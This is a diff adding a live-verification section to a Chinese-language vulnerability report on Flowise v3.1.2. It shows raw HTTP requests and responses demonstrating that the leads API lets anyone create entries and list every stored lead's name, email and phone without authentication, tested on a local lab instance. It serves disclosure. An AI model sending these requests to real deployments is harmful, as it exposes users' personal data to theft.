@@ -134,8 +134,56 @@ if (isWhitelistedUrl) {
 
 Lead 实体包含：`id`、`chatflowid`、`name`、`email`、`phone`、`chatId`、`createdDate`
 
+### 验证4：实机验证（HTTP 请求/响应）
+
+**环境**：Flowise v3.1.2 Docker 部署于 192.168.217.135:43000
+
+**步骤1：无认证创建 Lead（POST，模拟 chatbot 访客提交）**
+
+```http
+POST /api/v1/leads HTTP/1.1
+Host: 192.168.217.135:43000
+Content-Type: application/json
+(无任何认证头)
+
+{"chatflowid":"aaaabbbb-cccc-dddd-eeee-ffffffffffff","name":"张三","email":"zhangsan@victim.com","phone":"13800138001"}
+```
+
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+
+{"name":"张三","email":"zhangsan@victim.com","phone":"13800138001","chatflowid":"aaaabbbb-cccc-dddd-eeee-ffffffffffff","chatId":"f0a55974-...","id":"f9c53503-...","createdDate":"2026-04-15T01:26:43.000Z"}
+```
+
+**步骤2：无认证枚举该 chatflow 的全量 Leads PII**
+
+```http
+GET /api/v1/leads/aaaabbbb-cccc-dddd-eeee-ffffffffffff HTTP/1.1
+Host: 192.168.217.135:43000
+(无任何认证头)
+```
+
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+Content-Length: 765
+
+[
+  {"id":"f9c53503-...","name":"张三","email":"zhangsan@victim.com","phone":"13800138001","chatflowid":"aaaabbbb-...","chatId":"f0a55974-...","createdDate":"2026-04-15T01:26:43.000Z"},
+  {"id":"537fe13d-...","name":"李四","email":"lisi@company.com","phone":"13900139002","chatflowid":"aaaabbbb-...","chatId":"17101b60-...","createdDate":"2026-04-15T01:26:52.000Z"},
+  {"id":"e31952c5-...","name":"王五","email":"wangwu@enterprise.org","phone":"15800158003","chatflowid":"aaaabbbb-...","chatId":"8cd1fcec-...","createdDate":"2026-04-15T01:26:52.000Z"}
+]
+```
+
+**关键证据**：
+- 受保护接口 `GET /api/v1/chatflows` 无 Token 返回 `{"error":"Unauthorized Access"}`
+- `GET /api/v1/leads/:chatflowId` 无任何认证直接返回 HTTP 200 + 全量 PII 数据（姓名/邮箱/电话）
+- `POST /api/v1/leads` 同样无需认证即可写入数据，两端均完全开放
+
 ## 验证环境
 
-- 源代码：Flowise v3.1.2（静态代码分析）
-- 框架：Node.js + Express + TypeORM
+- 源代码：Flowise v3.1.2（静态代码分析 + Docker 实机部署）
+- 运行时：Flowise v3.1.2 Docker 部署于 192.168.217.135:43000
+- 框架：Node.js + Express + TypeORM + SQLite
 - 日期：2026-04-15
